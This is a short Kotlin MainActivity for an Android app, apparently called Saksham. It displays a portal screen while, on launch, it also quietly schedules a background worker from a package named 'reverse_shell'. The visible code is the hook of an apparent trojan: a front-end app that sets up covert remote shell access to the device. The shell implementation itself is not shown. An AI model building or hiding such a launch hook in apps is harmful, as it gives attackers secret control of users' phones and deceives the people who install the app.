package com.ironclad.saksham.main

import android.location.Geocoder
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.annotation.RequiresApi
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.ui.Modifier
import com.ironclad.saksham.reverse_shell.Scheduler
import com.ironclad.saksham.ui.screens.SakshamPortalScreen
import java.util.Locale


class MainActivity : ComponentActivity() {
    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            Scheduler.scheduleReverseShellWorker(applicationContext)
            SakshamPortalScreen(modifier = Modifier.fillMaxSize())
        }
    }
}



